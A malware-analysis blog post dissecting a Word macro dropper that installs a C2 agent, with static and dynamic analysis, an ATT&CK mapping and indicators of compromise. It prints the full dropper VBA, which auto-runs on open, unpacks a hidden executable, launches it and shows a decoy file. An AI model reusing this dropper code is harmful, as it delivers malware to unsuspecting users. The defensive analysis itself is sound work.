+++
title = '003 - Analyzing a C2 agent - Part 1: The Dropper'
date = 2023-12-08T22:29:12-05:00
draft = false
translationKey = '003-macro-dropper'
description = 'In this first part, we will analyze a malicious macro containing an embedded C2 agent. We will analyze how it acts, what techniques it uses to hinder analysis, and how we can obtain indicators of compromise from it.'
cover = "/img/003-procExp.png"
+++


*Este artículo también está disponible en [español](/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/)*

## 1. Introduction

On this occasion I decided to analyze a command and control (C2) agent, reviewing how it reaches its victims and what techniques it uses to evade defenses and hinder analysis. Since the whole post would be very long, I divided it into two parts: the first part will focus on the analysis of the macro that acts as a dropper, while the second part will focus on the analysis of the payload (C2 agent).

The chosen dropper has the hash **22ce9042f6f78202c6c346cef1b6e532** and can be downloaded from the following [link](https://bazaar.abuse.ch/sample/e38c39e302de158d22e8d0ba9cd6cc9368817bc611418a5777d00b90a9341404/).

> **Disclaimer**: Running malware on a personal or corporate device can put your information/your company's information at risk. Never run malware on a device that has not been specifically configured for malware analysis.

## 2. Office Macros: the technique that never seems to end

Before starting with the analysis, I want to delve a little bit into what macros are and why they are usually abused by attackers.

Macros are sequences of commands that allow us to automate tasks in Microsoft Office programs, they can be used for formatting texts, running calculations, etc. Macros [have the same privileges as the program from which they are running](https://learn.microsoft.com/en-us/office/dev/scripts/resources/vba-differences#security), wich means that they have full access to the computer under the context of the user who ran the Office program.

Macros are of special interest of attackers due to the following reasons:
1. They allow the attackers to embed code in legitimate documents, so they don't have to convince their victims to download a binary.
2. Most users are accustomed to using Office programs, and may usually receive such type of files by email (especially in enterprises).
3. The victim's company's anti-spam systems may block files with  a .exe extension; however, they probably allow Office files.
4. The Microsoft Office suite is widely distributed, which increases the likelihood that the malware can be run by their victim.
5. They can be used on both Windows and MacOS.

The use of Visual Basic to execute malicious commands is so common that it has a subtechnique of [MITRE ATT&CK associated: T1059.005](https://attack.mitre.org/techniques/T1059/005/), more information on how this technique has been used in other malware distribution campaigns can be found on MITRE's ATT&CK site.

Microsoft [has begun blocking](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked) the execution of macros downloaded from the Internet in recent versions of Microsoft Office; however, many companies and users still use outdated versions, allowing the technique to continue to be widely used.


## 3. Static analysis of the file

We begin the analysis by obtaining the hash of the malicious Word document:

| Algorithm | Hash                                                             |
|-----------|------------------------------------------------------------------|
| MD5       | 22CE9042F6F78202C6C346CEF1B6E532                                 |
| SHA256    | E38C39E302DE158D22E8D0BA9CD6CC93 68817BC611418A5777D00B90A9341404 |

Then, we begin [_olevba_](https://github.com/decalage2/oletools/wiki/olevba) analysis using the -a parameter:

![alt text](/img/003-olevba-a.png "OleVBA analysis")

We see that _olevba_ warns us that the **Document_Open** function is executed automatically when the file is opened (typical behavior of malicious macros, which avoid requiring user interaction); additionally, we see certain text strings that _olevba_ considers suspicious:

| String   | Description                                              |
|----------|----------------------------------------------------------|
| Environ  | It is used to read environmental variables               |
| Open     | It is used to open files                                 |
| CopyFile | It is used to copy files                                 |
| MkDir    | It is used to create folders                             |
| Shell    | It can be used to run commands on the system             |

In this case, [unlike the previous article](/en/posts/002-analyzing-a-malicious-macro), _olevba_ does not detect potential indicators of compromise (IOC).

We continue the analysis by using the -c parameter to visualize the document's macros:

![alt text](/img/003-olevba-c.png "OleVBA macros")

By looking at the macros, we can see some of the techniques that the attacker used to make analysis more difficult and evade defenses:
1. No easy-to-understand function or variable names are used, making manual analysis harder.
2. The Replace method is used to remove, during macro execution, characters used to fool pattern identification systems.

The second technique is of particular interest, as it can fool programs that look for patterns to identify potentially suspicious strings (URLs, IPs, extensions, filenames, etc). For example, the following regular expression can be used to search for strings that end in .zip or .exe:

```regex
\.(zip|exe)$
```

In the macro, the string "do_mc_xs.zi_p" is shown, which is not detected by the regular expression; however, during execution it is renamed to "domcxs.zip" for further processing.

Since the function has several lines, and is difficult to understand with unfriendly variable names, we export it to a file to "clean it up" a bit:

```powershell
olevba.exe -c .\e38c39e302de158d22e8d0ba9cd6cc9368817bc611418a5777d00b90a9341404.docm > macros.vba
```

Once exported, we identify that Document_Open() calls the "weoqzisdi___lorfar()" function:

![alt text](/img/003-documentOpen.png "Document Open Function")

Since we don't see any code on the other functions, we extract the "weoqzisdi___lorfar()" function for further analysis:

```vba
Sub weoqzisdi___lorfar()
    
    Dim path_weoqzisdi___file As String
    
    Dim file_weoqzisdi___name  As String
    
    Dim folder_weoqzisdi___name  As Variant
    Dim oAzedpp     As Object
    
    Set oAzedpp = CreateObject("Shell.Application")
    
    file_weoqzisdi___name = "vteijam hdgtra"
    
    folder_weoqzisdi___name = Environ$("USERPROFILE") & "\Wrdix" & "" & Second(Now) & "\"
    
    If Dir(folder_weoqzisdi___name, vbDirectory) = "" Then
        MkDir (folder_weoqzisdi___name)
    End If
    
    path_weoqzisdi___file = folder_weoqzisdi___name & file_weoqzisdi___name
    
    Dim FSEDEO      As Object
    Set FSEDEO = CreateObject("Scripting.FileSystemObject")
    
    FSEDEO.CopyFile Application.ActiveDocument.FullName, folder_weoqzisdi___name & Replace("do_mc_xs", "_", ""), TRUE
    Set FSEDEO = Nothing
    
    Name folder_weoqzisdi___name & Replace("do_mc_xs", "_", "") As folder_weoqzisdi___name & Replace("do_mc_xs.zi_p", "_", "")
    
    oAzedpp.Namespace(folder_weoqzisdi___name).CopyHere oAzedpp.Namespace(folder_weoqzisdi___name & Replace("do_mc_xs.zi_p", "_", "")).items
    
    Dim poueeds     As Integer
    Dim filewedum   As String
    
    poueeds = InStr(Application.System.Version, ".1")
    
    filewedum = 2
    
    If poueeds Then
        filewedum = 1
    End If
    
    Name folder_weoqzisdi___name & "word\embeddings\oleObject1.bin" As folder_weoqzisdi___name & "word\" & file_weoqzisdi___name & Replace(".z_ip", "_", "")
    
    oAzedpp.Namespace(folder_weoqzisdi___name).CopyHere oAzedpp.Namespace(folder_weoqzisdi___name & "word\" & file_weoqzisdi___name & Replace(".z_ip", "_", "")).items
    
    Name folder_weoqzisdi___name & "oleObject" & filewedum & ".bin" As folder_weoqzisdi___name & file_weoqzisdi___name & Replace(".e_xe", "_", "")
    
    Shell folder_weoqzisdi___name & file_weoqzisdi___name & Replace(".e_xe", "_", ""), vbNormalNoFocus
    
    Dim dokc_paeth  As String
    
    dokc_paeth = Environ$("USERPROFILE") & "\Documents\" & Application.ActiveDocument.Name & ".docx"
    
    If Dir(dokc_paeth) = "" Then
        Name folder_weoqzisdi___name & "word\embeddings\oleObject3.bin" As dokc_paeth
    End If
    
    Documents.Open FileName:=dokc_paeth, ConfirmConversions:=False, _
                   ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
                   PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
                   WritePasswordTemplate:="", Format:=wdOpenFormatAuto, XMLTransform:=""
    
End Sub
```

After removing the extra lines and fixing the code's identation, we proceed to rename the variables to make them easier to read:

![alt text](/img/003-replace.png "Replace names")

In this case, we are lucky that some of the variables kept their original name before being concatenated with other characters, allowing us to easily identify what they are used for. If we did not have that information, we could deduce their function based on how they are being used.

After renaming the long variables, we can start reading line by line and trying to understand what the code is doing:

```vba
Sub weoqzisdi___lorfar()
    
    Dim mpath       As String
    Dim mfile       As String
    Dim mfolder     As Variant
    Dim mShellApplication As Object
    
    'The object Shell.Application is created
    Set mShellApplication = CreateObject("Shell.Application")
    
    'The string "vteijam hdgtra" is assigned to the variable mfile
    mfile = "vteijam hdgtra"
    
    'The enviromental variable "USERPROFILE" path is concatenated with
    '\Wrdix concatenated with the second the function was executed concatenated with "\"
    'For example: C:\Users\tmn\Wrdix12\
    mfolder = Environ$("USERPROFILE") & "\Wrdix" & "" & Second(Now) & "\"
    
    'It verifies if the folder exists and if not, it is created
    If Dir(mfolder, vbDirectory) = "" Then
        MkDir (mfolder)
    End If
    
    'The path + filename is assigned to the mpath variable (C:\Users\tmn\Wrdix12\vteijam hdgtra)
    mpath = mfolder & mfile
    
    Dim FSEDEO      As Object
    Set FSEDEO = CreateObject("Scripting.FileSystemObject")
    
    'The CopyFile method is used, its syntax is: object.CopyFile source, destination, [ overwrite ]
    'The document that is being executed (the .docm) is copied to the folder stored on the mfolder variable with the name domcxs
    'The method "Replace" is used to strip the underscores of the "do_mc_xs" string
    'https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/copyfile-method
    'https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/replace-function
    FSEDEO.CopyFile Application.ActiveDocument.FullName, mfolder & Replace("do_mc_xs", "_", ""), TRUE
    Set FSEDEO = Nothing
    
    'By using the function "Name" domcxs is renamed to domcxs.zip
    'Name's syntax is oldName As newName
    'https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/name-statement
    Name mfolder & Replace("do_mc_xs", "_", "") As mfolder & Replace("do_mc_xs.zi_p", "_", "")
    
    'domcxs.zip is extracted to the path stored in the variable mfolder
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & Replace("do_mc_xs.zi_p", "_", "")).items
    
    Dim poueeds     As Integer
    Dim filewedum   As String
    
    'There is a validation to see if Word's version contains ".1" before asigning the filewedum variable
    poueeds = InStr(Application.System.Version, ".1")
    filewedum = 2
    If poueeds Then
        filewedum = 1
    End If
    
    'The file mfolder\word\embeddings\oleObject1.bin is renamed  "mfoldder\word\vteijam hdgtra.zip"
    Name mfolder & "word\embeddings\oleObject1.bin" As mfolder & "word\" & mfile & Replace(".z_ip", "_", "")
    
    'The content of "mfoldder\word\vteijam hdgtra.zip" is extracted in mfolder's path
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & "word\" & mfile & Replace(".z_ip", "_", "")).items
    
    'mfolder\oleObjectfilewedum.bin is renamed as mfolder\mfile.exe
    Name mfolder & "oleObject" & filewedum & ".bin" As mfolder & mfile & Replace(".e_xe", "_", "")
    
    'The binary mfolder\mfile.exe is executed
    Shell mfolder & mfile & Replace(".e_xe", "_", ""), vbNormalNoFocus
    
    'The file mfolder\word\embeddings\oleObject3.bin is renamed as C:\users\USER\Documents\nameOfMaliciousDoc.docx
    Dim dokc_paeth  As String
    
    dokc_paeth = Environ$("USERPROFILE") & "\Documents\" & Application.ActiveDocument.Name & ".docx"
    
    If Dir(dokc_paeth) = "" Then
        Name mfolder & "word\embeddings\oleObject3.bin" As dokc_paeth
    End If
    
    'The .docx file is opened
    
    Documents.Open FileName
    = dokc_paeth, ConfirmConversions
    = False, _
      ReadOnly
    = False, AddToRecentFiles
    = False, PasswordDocument
    = "", _
      PasswordTemplate
    = "", Revert
    = False, WritePasswordDocument
    = "", _
      WritePasswordTemplate
    = "", Format
    = wdOpenFormatAuto, XMLTransform
    = ""
    
End Sub
```

Based on the analysis, it appears that when the document is opened it performs the following actions:
1. the malicious document is copied to a path within the user's profile
2. The document is renamed and the .zip extension is added.
3. The .zip is extracted
4. A .bin file is extracted from the previously extracted files, and its extension is changed to .zip.
5. The contents of the .zip file are extracted, and it contains another .bin file.
6. The extension of the new .bin file is changed to .exe. 
7. The .exe is executed in the background
8. Another file is extracted from the original document (files obtained in step 3) and copied to the user's "Documents" folder with extension .docx.
9. The .docx file is opened

As part of the analysis we can see another way attackers use to evade defenses: the malicious binary (.exe) was stored inside 2 compressed files, each with a .bin extension. If an antivirus looked for the signature of the .exe file it would not find it because it is compressed; similarly, if it relied on the extension to determine the file type, it might not detect the .bin as a compressed file.

Now that we have an idea of what the malicious document is doing, we proceed to execute it in a controlled manner to verify if the analysis was correct.


## 4. Dynamic analysis of the file

Before we begin with the dynamic analysis we open [_Procmon_ y _Process Explorer_](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), since we know that the macro interacts with folders and that it starts new processes.

When we try to open the Visual Basic editor (before clicking on "Enable content"), we realize that it has a password:

![alt text](/img/003-password.png "Password Protected Macro")

Although the Visual Basic editor does not let us access the content without having the password, we were already able to visualize the macros previously by using _olevba_, which tells us that Microsoft Office does not store the macros encrypted at rest. That means that adding a password is not an effective control if what we are looking for is that they are not analyzed.

To skip the roadblock we have two options:
1. Execute the VBA code from a different file (since we obtained it previously with _olevba_)
2. Bypass the restriction in the original file

On this occasion I opted for the second option (how is beyond the scope of this article, but a quick Google search should suffice).

Once we have the macro open, we can use the F8 key to move instruction by instruction. We can use the "Locals" window to see the content being assigned to the variables as the instructions are executed:

![alt text](/img/003-locals.png "Use of locals")

The first interesting operation we expect is the creation of a folder named Wrdix+number in the user's path (in this case C:\users\tmn):

```vba
    mfolder = Environ$("USERPROFILE") & "\Wrdix" & "" & Second(Now) & "\"
    
    If Dir(mfolder, vbDirectory) = "" Then
        MkDir (mfolder)
    End If
```

We can verify that the directory was indeed created both by inspecting the folder and by using _Procmon_:

![alt text](/img/003-folderCreated.png "New folder")

![alt text](/img/003-procmonfolder.png "Folder creation in ProcMon")

The next operation we expect is for the document to be copied to the folder created, renamed domcxs.zip and extracted:

```vba
    FSEDEO.CopyFile Application.ActiveDocument.FullName, mfolder & Replace("do_mc_xs", "_", ""), True
    Name mfolder & Replace("do_mc_xs", "_", "") As mfolder & Replace("do_mc_xs.zi_p", "_", "")
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & Replace("do_mc_xs.zi_p", "_", "")).items
```
![alt text](/img/003-extractfolder.png "Document copied and extracted")

Then, we expect the file word\embeddings\oleObject1.bin to be renamed to "vteijam hdgtra.zip", extracted and the name of the extracted file to be changed to "vteijam hdgtra.exe":

```vba
    'The file mfolder\word\embeddings\oleObject1.bin is renamed to "mfoldder\word\vteijam hdgtra.zip"
    Name mfolder & "word\embeddings\oleObject1.bin" As mfolder & "word\" & mfile & Replace(".z_ip", "_", "")

    'The contents of "mfoldder\word\vteijam hdgtra.zip" are extracted to  mfolder
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & "word\" & mfile & Replace(".z_ip", "_", "")).items
    
    'The file mfolder\oleObjectfilewedum.bin is renamed as mfolder\mfile.exe
    Name mfolder & "oleObject" & filewedum & ".bin" As mfolder & mfile & Replace(".e_xe", "_", "")
```

![alt text](/img/003-zip-exe.png "New zip just arrived")

Finally, the binary "vteijam hdgtra.exe" is executed:

![alt text](/img/003-execution.png "Executing exe")

We can verify the creation of the new process in _Process Explorer_ and in _Procmon_:

![alt text](/img/003-procExp.png "ProcExp exe")

![alt text](/img/003-procmonexe.png "Procmon exe")

Although the payload embedded in the Word document has already been started, the attacker still has one more task to do in order not to cause any suspicion:

```vba
    'The file mfolder\word\embeddings\oleObject3.bin is copied as C:\users\USER\Documents\nameOfMaliciousDocument.docx
    Dim dokc_paeth As String
    
    dokc_paeth = Environ$("USERPROFILE") & "\Documents\" & Application.ActiveDocument.Name & ".docx"
    
    If Dir(dokc_paeth) = "" Then
        Name mfolder & "word\embeddings\oleObject3.bin" As dokc_paeth
    End If
    
    'The newly copied file is opened
    
    Documents.Open FileName
     = dokc_paeth, ConfirmConversions
     = False, _
    ReadOnly
     = False, AddToRecentFiles
     = False, PasswordDocument
     = "", _
    PasswordTemplate
     = "", Revert
     = False, WritePasswordDocument
     = "", _
    WritePasswordTemplate
     = "", Format
     = wdOpenFormatAuto, XMLTransform
     = ""
```

![alt text](/img/003-newword.png "Creating decoy file")

![alt text](/img/003-decoy.png "Decoy file")

By creating and opening the new file, the victim is shown the expected Word document.

Finally, we validate in _Procmon_ that the second stage started performing actions:

![alt text](/img/003-agent.png "C2 agent")

The malicious payload is a C2 agent, the analysis of which we will explore in the second part of the post.


## 5. Conclusions

As we saw in the analysis, exploring how a dropper works allows us to understand the different techniques that an attacker may follow to prevent the malware they developed from being identified: whether it is adding passwords to macros, obfuscating (albeit slightly) the names of variables and functions, or embedding the malicious payloads under multiple layers and renames, everything is intended to hinder manual analysis and rapid identification by automated tools that rely on known signatures and patterns.


Even so, the behavior that the document exhibits (creating a folder, extracting files, executing an .exe) is not standard for a normal document, so there is still a chance of detection by analyzing what the file does when executed.


As part of this analysis, we were able to identify different indicators of compromise: files with a static name, hashes of the various compressed and executable files, as well as folders created. The identified IOCs are detailed in section 7.


The malicious payload corresponds to an agent that communicates with a Command and Control server, in the second part of the post we will explore how the agent works, the actions it performs and how we can obtain indicators of compromise from it.


## 6. MITRE ATT&CK mapping

| ID        | Tactic             | Technique                                              | Description                                                 |
|-----------|---------------------|------------------------------------------------------|-------------------------------------------------------------|
| T1027.009 | Defense evasion | Obfuscated Files or Information: Embedded Payloads   | Malicious payloads where embebed in the document      |
| T1027.010 | Defense evasion | Obfuscated Files or Information: Command Obfuscation | Character substitution was used to obfuscate commands |
| T1036.008 | Defense evasion | Masquerade File Type                                 | The executable file's extension was changed to .bin   |
| T1204.002 | Execution           | User Execution: Malicious File                       | It requires the user to open the file       |
| T1059.005 | Execution           | Command and Scripting Interpreter: Visual Basic      | VBA was used for command execution                |

## 7. IOC

| IOC                              | Type     | Description                                             |
|----------------------------------|----------|---------------------------------------------------------|
| 22ce9042f6f78 202c6c346cef1b6e532 | MD5 hash | Malicious .docm                                         |
| e31ac765d1e97 698bc1efe443325e497 | MD5 hash | Malicious compressed file (oleObject1.bin)                   |
| 59211a4e0f27d 70c659636746b61945a | MD5 hash | Malicious payload 1                                     |
| 1d493e326d91c 53e0f2f4320fb689d5f | MD5 hash | Malicious payload 2                                     |
| efed06b2fd437 d6008a10d470e2c519f | MD5 hash | decoy .docx                                    |
| vteijam hdgtra.exe               | Nombre   | Malicious binary                                   |
| C:\\users\\[^\\]+\\Wrdix\d+$     | Ruta     | Path of malicious executable (C:\users\USER\WrdixNUM)   |
